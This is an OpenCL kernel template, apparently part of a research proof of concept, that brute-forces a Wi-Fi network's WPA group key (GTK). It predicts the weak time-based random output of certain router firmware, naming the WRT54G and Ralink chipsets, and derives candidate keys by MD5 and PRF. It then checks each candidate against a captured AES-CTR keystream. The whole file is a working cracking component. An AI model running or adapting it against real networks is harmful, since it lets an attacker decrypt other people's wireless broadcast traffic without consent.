/*
 * This software is Copyright (c) 2016 Mathy Vanhoef and it is hereby released
 * to the general public under the following terms: Redistribution and use in
 * source and binary forms, with or without modification, are permitted.
 *
 * TODO: Speed up execution of AES
 */
#include "util.cl"
#include "md5_kernel.cl"
#include "ieeeprf.cl"
#include "AESOpenCL.cl"

#define RANDVAL1	0x6B8B4567
#define RANDVAL2	0x327B23C6
#define GMK_SECS	0x%(SECONDS)08X
#define GMK_USECS	0x%(MICROSECONDS)08X


/**
 * WARNING: The search space can be at most one second when using this code (which should be sufficient)
 */
#define SET_TIME(W, usecs, overflow, seconds, microseconds, delta, randval) \
	do {												\
		usecs    = microseconds + delta;				\
		overflow = usecs >= 1000000;					\
		W[0]     = (seconds + overflow) ^ randval;		\
		W[1]     = (usecs - overflow * 1000000);		\
	} while(0)


__kernel void search_gtk(__global uint *dst)
{
	unsigned int boot_time_delta = get_global_id(0);
	// data contians `MAC address || GNONCE` and is filled in by the CPU
	uint data[10] = {%(DATA)s};
	uint W[16] = {};
	uint gmk[8] = {};
	uint gtk[8] = {};
	// Variables to test decryption with GTK
	uint nonce[4] = {0x%(NONCE1)08X, 0x%(NONCE2)08X, 0x%(NONCE3)08X, 0x%(NONCE4)08X};
	uint xorpad[4];
	AES_KEY key;
	// Used by SET_TIME macro
	uint temp1, temp2;

	//
	// Step 1. Perform the first nas_rand128 call, current time based on passed work id
	// 

	// First rand128 call - md5 expects W in little endian
	SET_TIME(W, temp1, temp2, GMK_SECS, GMK_USECS, boot_time_delta, RANDVAL1);
	W[4] = 0x80;
	W[14] = 16 << 3;
	md5_hash(gmk    , W);

	//
	// Step 2. Go over all possibilities for the second nas_rand128 call.
	//

	// On max 3600 MHz the difference is less than 50 us. On the 200 MHz processor of the WRT54gv5 this
	// means a difference of 50*18 = 900. Against Ralink one jiffy would be 4 miliseconds.
	// --> The second call always finishes within 4 miliseconds, probably even with 1 or 2 miliseconds.
	for (int i = 0; i < 4000; ++i)
	{
		// Second rand128 call
		SET_TIME(W, temp1, temp2, GMK_SECS, GMK_USECS, boot_time_delta + i, RANDVAL2);
		md5_hash(gmk + 4, W);

		// Convert GMK to proper endian
		for (int i = 0; i < 8; ++i)
			gmk[i] = SWAP32(gmk[i]);

		//
		// Step 3. Derive GTK from GMK and constructed data (data = MAC address || GNONCE)
		//

		prf256_gtk(gmk, data, gtk);

		// Set the key and derive the AES-CTR keystream (input/output is Little Endian)
		AES_set_encrypt_key(gtk, &key);
		AES_encrypt(nonce, xorpad, &key);

		if (xorpad[0] == 0x%(KEYSTREAM1)08X && xorpad[1] == 0x%(KEYSTREAM2)08X) {
			COPY_GTK(dst, gtk);
			return;
		}
	}
}

